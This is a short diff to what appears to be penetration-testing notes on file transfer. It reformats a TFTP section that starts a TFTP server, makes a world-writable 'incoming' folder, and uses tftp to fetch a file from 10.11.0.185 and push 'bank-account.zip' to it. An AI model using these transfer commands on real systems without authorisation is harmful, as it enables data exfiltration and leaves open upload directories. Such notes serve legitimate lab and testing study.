@@ -17,7 +17,11 @@ Will serve up on port 8000 in the folder you run the script from
 #### TFTP
 ```
 atftpd --daemon --port 69 /tftp
-cd /tftp touch incoming chmod 777 incoming
+
+cd /tftp 
+touch incoming 
+chmod 777 incoming
+
 tftp -i 10.11.0.185 GET test.txt
 tftp -i 10.11.0.185 PUT bank-account.zip incoming
 ```
